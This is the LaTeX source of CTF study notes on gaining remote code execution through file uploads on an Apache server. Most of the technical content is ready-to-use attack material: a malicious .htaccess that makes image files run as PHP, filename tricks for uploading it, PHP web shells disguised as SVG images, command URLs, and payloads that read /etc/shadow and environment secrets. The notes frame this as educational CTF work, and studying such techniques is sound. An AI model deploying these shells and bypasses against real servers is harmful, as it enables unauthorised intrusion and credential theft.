\documentclass[12pt]{article}
\usepackage[utf8]{inputenc}
\usepackage{geometry}
\geometry{a4paper, margin=1in}
\usepackage{hyperref}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{tcolorbox}
\usepackage{amsmath}
\usepackage{amssymb}
\usepackage{algorithm}
\usepackage{algpseudocode}
\usepackage{graphicx}
\usepackage{parskip}
\usepackage{titlesec}
\usepackage{fancyhdr}
\usepackage{enumitem}

% Colors for highlighting
\definecolor{codeblue}{RGB}{0,100,200}
\definecolor{codegreen}{RGB}{0,150,100}
\definecolor{codegray}{RGB}{100,100,100}
\definecolor{codered}{RGB}{200,50,50}
\definecolor{backcolour}{RGB}{240,245,250}

% Listings configuration
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen},
    keywordstyle=\color{codeblue},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codered},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2
}
\lstset{style=mystyle}

% Header and footer
\pagestyle{fancy}
\fancyhf{}
\rhead{CTF Notes: Apache .htaccess Exploitation}
\lhead{\today}
\rfoot{Page \thepage}

% Title formatting
\titleformat{\section}
{\normalfont\Large\bfseries\color{codeblue}}{\thesection}{1em}{}
\titleformat{\subsection}
{\normalfont\large\bfseries\color{codegreen}}{\thesubsection}{1em}{}

\begin{document}

% Title page
\begin{titlepage}
    \centering
    \vspace*{2cm}
    {\Huge\bfseries CTF Notes: Apache .htaccess Exploitation \par}
    \vspace{1cm}
    {\Large File Upload Vulnerabilities and RCE Techniques \par}
    \vspace{2cm}
    {\large \textbf{Author:} Eyad Islam El-Taher \par}
    \vspace{1cm}
    {\large \textbf{Date:} \today \par}
    \vspace{2cm}
    \begin{tcolorbox}[colback=red!5!white,colframe=red!75!black]
        \centering
        \textbf{DISCLAIMER:} For educational purposes only.\\
        Use only on systems you own or have explicit permission to test.
    \end{tcolorbox}
    \vfill
\end{titlepage}



\section{Introduction to the CTF Challenge}
\label{sec:intro}

\subsection{Challenge Description}
\begin{tcolorbox}[title=Challenge Brief]
\textbf{Scenario:} A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded.

\textbf{Vulnerability:} SVG files are accepted as images, but the server may execute them incorrectly.

\textbf{Objective:} Achieve Remote Code Execution (RCE) using JavaScript/PHP via file upload.
\end{tcolorbox}

\subsection{Target Analysis}
\begin{itemize}[leftmargin=*]
    \item \textbf{Server:} Apache/2.4.62
    \item \textbf{Upload Type:} Image files (SVG accepted)
    \item \textbf{Defense:} Basic file type filtering
    \item \textbf{Attack Vector:} File upload → .htaccess manipulation → RCE
\end{itemize}

\section{Understanding .htaccess Files}
\label{sec:htaccess}

\subsection{What is .htaccess?}
\textbf{.htaccess} (Hypertext Access) is a configuration file used by Apache web servers to control directory-level settings without modifying the main server configuration.

\subsection{Key Characteristics}
\begin{itemize}
    \item \textbf{Hidden file} (starts with a dot)
    \textbf{Apache-specific} configuration
    \item \textbf{Directory-level} scope (affects current directory and subdirectories)
    \item \textbf{Processed on every request} (performance impact)
    \item \textbf{Can override global Apache settings}
\end{itemize}

\subsection{Common Uses in Legitimate Context}
\begin{lstlisting}[caption=Common .htaccess Directives]
# URL Rewriting
RewriteEngine On
RewriteRule ^blog/([0-9]+)/?$ blog.php?id=$1

# Password Protection
AuthType Basic
AuthName "Restricted Area"
AuthUserFile /path/to/.htpasswd
Require valid-user

# Custom Error Pages
ErrorDocument 404 /errors/404.html

# Security Headers
Header set X-Frame-Options "DENY"
\end{lstlisting}

\subsection{Security Impact: Why .htaccess is Dangerous}
\begin{tcolorbox}[colback=red!5!white,colframe=red!75!black,title=Critical Security Note]
If an attacker can upload a .htaccess file, they can:
\begin{enumerate}
    \item Force Apache to treat any file type as PHP
    \item Execute arbitrary code from uploaded files
    \item Bypass upload restrictions
    \item Achieve Remote Code Execution (RCE)
\end{enumerate}
\end{tcolorbox}

\section{The Attack Methodology}
\label{sec:attack}

\subsection{Attack Flow Diagram}
\begin{figure}[h!]
    \centering
    \fbox{\parbox{0.8\textwidth}{
        \centering
        \textbf{Attack Chain:}\\
        \begin{algorithmic}[1]
            \State Upload .htaccess with PHP handler configuration
            \State Upload SVG containing PHP web shell
            \State Access SVG file via browser
            \State Execute system commands via GET parameters
            \State Establish reverse shell for persistence
        \end{algorithmic}
    }}
    \caption{Attack methodology flowchart}
    \label{fig:attack-flow}
\end{figure}

\subsection{Step 1: Upload Malicious .htaccess}
\label{subsec:step1}

\begin{lstlisting}[caption=Malicious .htaccess to force PHP execution]
# Method 1: AddType directive
AddType application/x-httpd-php .svg .jpg .png .gif

# Method 2: SetHandler directive
<FilesMatch "\.(svg|jpg|png|gif)$">
    SetHandler application/x-httpd-php
</FilesMatch>

# Method 3: ForceType directive
ForceType application/x-httpd-php

# Combined approach for maximum reliability
AddType application/x-httpd-php .svg
AddHandler application/x-httpd-php .svg
Options +ExecCGI
\end{lstlisting}

\subsubsection{Bypass Techniques for .htaccess Upload}
\begin{enumerate}
    \item \textbf{Case variation:} \texttt{.HTACCESS}, \texttt{.HtAccess}
    \item \textbf{Trailing dot:} \texttt{.htaccess.}
    \item \textbf{Double extension:} \texttt{.htaccess.jpg}
    \item \textbf{Null byte injection:} \texttt{.htaccess\%00.jpg}
    \item \textbf{URL encoding:} \texttt{\%2ehtaccess}
    \item \textbf{No leading dot:} \texttt{htaccess}
\end{enumerate}

\subsection{Step 2: Upload SVG with PHP Payload}
\label{subsec:step2}

\begin{lstlisting}[language=php, caption=PHP web shell embedded in SVG]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
    
    <!-- PHP web shell - Multiple execution methods -->
    <?php
    // Method 1: system() function
    if(isset($_GET['cmd'])) {
        echo '<text x="10" y="20" font-family="monospace">';
        echo htmlspecialchars(system($_GET['cmd']));
        echo '</text>';
    }
    
    // Method 2: shell_exec() function
    if(isset($_GET['exec'])) {
        echo '<text x="10" y="50">';
        echo shell_exec($_GET['exec']);
        echo '</text>';
    }
    
    // Method 3: passthru() function
    if(isset($_GET['run'])) {
        echo '<text x="10" y="80">';
        passthru($_GET['run']);
        echo '</text>';
    }
    ?>
    
    <!-- Visual element to make it look like a real SVG -->
    <rect width="100%" height="100%" fill="#f0f0f0"/>
    <circle cx="200" cy="200" r="100" fill="blue"/>
    
</svg>
\end{lstlisting}

\subsubsection{One-Liner SVG Payloads}
\begin{lstlisting}[language=xml]
<!-- Ultra-minimal payload -->
<svg xmlns="http://www.w3.org/2000/svg"><?=`$_GET[0]`?></svg>

<!-- With error suppression -->
<svg xmlns="http://www.w3.org/2000/svg"><?php @system($_GET['c']);?></svg>

<!-- Base64 encoded command -->
<svg xmlns="http://www.w3.org/2000/svg">
<?php system(base64_decode($_GET['b'])); ?>
</svg>
\end{lstlisting}

\subsection{Step 3: Execute Commands}
\label{subsec:step3}

\begin{tcolorbox}[title=Command Execution Examples]
Access the uploaded SVG with these URLs:
\begin{itemize}
    \item \texttt{http://target.com/uploads/shell.svg?cmd=whoami}
    \item \texttt{http://target.com/uploads/shell.svg?exec=ls -la}
    \item \texttt{http://target.com/uploads/shell.svg?run=cat /etc/passwd}
    \item \texttt{http://target.com/uploads/shell.svg?0=id} (for one-liner)
\end{itemize}
\end{tcolorbox}


\section{Common RCE Payloads}
\begin{lstlisting}[language=bash]
# List directory contents
?cmd=ls -la

# Read system files
?cmd=cat /etc/passwd
?cmd=cat /etc/shadow
?cmd=cat /proc/self/environ

# Check current user
?cmd=whoami
?cmd=id

# Network information
?cmd=ifconfig
?cmd=netstat -tulpn

# Find flag files
?cmd=find / -name "*flag*" 2>/dev/null
?cmd=find / -type f -name "*.txt" 2>/dev/null | xargs grep -l "CTF{"
\end{lstlisting}

\subsection{File Upload Bypass Techniques}
\begin{tabular}{|l|l|}
\hline
\textbf{Technique} & \textbf{Example} \\
\hline
Double Extension & shell.svg.php \\
\hline
Case Manipulation & shell.SvG \\
\hline
Trailing Spaces & shell.svg[space] \\
\hline
Null Byte & shell.svg\%00.jpg \\
\hline
Content-Type Spoofing & image/svg+xml \\
\hline
Magic Bytes & GIF89a at start \\
\hline
\end{tabular}


\end{document}